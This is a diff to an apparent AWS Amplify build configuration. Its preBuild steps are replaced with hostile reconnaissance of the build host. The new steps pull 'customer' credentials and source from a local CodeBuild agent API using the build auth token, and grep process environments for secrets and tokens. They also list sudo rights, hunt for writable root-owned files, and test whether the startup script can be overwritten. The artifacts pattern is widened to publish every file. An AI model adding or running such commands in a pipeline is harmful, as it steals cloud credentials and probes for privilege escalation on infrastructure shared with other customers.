@@ -4,21 +4,25 @@ frontend:
     preBuild:
       commands:
         - echo "=== ID ===" && id
-        - echo "=== KERNEL ===" && uname -a
-        - echo "=== ENV ===" && env | grep -iE "AWS|AMPLIFY|DOCKER|TOKEN|SECRET|CRED|ENDPOINT" | sort
-        - echo "=== CAPS ===" && cat /proc/1/status | grep -iE "cap|seccomp|uid"
-        - echo "=== CGROUP ===" && cat /proc/1/cgroup | head -3
+        - echo "=== GROUP WRITABLE FILES ===" && find / -group root -writable -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null | head -20
+        - echo "=== GROUP WRITABLE DIRS ===" && find / -group root -writable -type d -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null | head -15
+        - echo "=== AGENT API ===" && curl -s "http://127.0.0.1:7831/ping?auth_token=$CODEBUILD_AUTH_TOKEN" 2>/dev/null
+        - echo "=== AGENT CREDS ===" && curl -s "http://127.0.0.1:7831/api/v1/credentials/customer?auth_token=$CODEBUILD_AUTH_TOKEN" 2>/dev/null | head -c 200
+        - echo "=== AGENT SOURCE ===" && curl -s "http://127.0.0.1:7831/api/v1/source?auth_token=$CODEBUILD_AUTH_TOKEN" 2>/dev/null | head -c 300
+        - echo "=== PID1 ENVIRON ===" && cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE "SECRET|TOKEN|AUTH|KEY" | head -5
+        - echo "=== SUDO ===" && sudo -l 2>&1 | head -5
+        - echo "=== LD_PRELOAD ===" && echo "LD_PRELOAD=$LD_PRELOAD"
+        - echo "=== CHANGEHOSTNAME ===" && ls -la /changehostname* /libchangehostname* 2>/dev/null || echo none
+        - echo "=== WRITABLE ROOT FILES ===" && find / -writable -user root -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null | head -15
+        - echo "=== STARTUP SCRIPTS ===" && ls -la /codebuild/readonly/start /codebuild/readonly/executor-log 2>/dev/null
+        - echo "=== CAN WE WRITE TO STARTUP? ===" && test -w /codebuild/readonly/start && echo "WRITABLE" || echo "not writable"
+        - echo "=== CODEBUILD ENV ===" && env | grep CODEBUILD | sort
         - echo "=== SETUID ===" && find / -perm -4000 -type f 2>/dev/null | head -5
-        - echo "=== WRITABLE ===" && find / -writable -user root -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null | head -10
-        - echo "=== DOCKER ===" && ls -la /var/run/docker.sock 2>/dev/null || echo no_docker
-        - echo "=== PROCS ===" && ps auxww | head -15
-        - echo "=== ROOT PROCS ===" && ps auxww | grep "^root" | head -5
-        - echo "=== IMDS ===" && (TOKEN=$(curl -s -m 3 -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds:21600") && ROLE=$(curl -s -m 3 -H "X-aws-ec2-metadata-token:$TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/) && echo "IMDS Role:$ROLE") || echo "IMDS blocked"
         - echo "=== DONE ==="
     build:
       commands:
-        - echo "build" > index.html
+        - echo done > index.html
   artifacts:
     baseDirectory: /codebuild/output/src
     files:
-      - index.html
+      - '**/*'
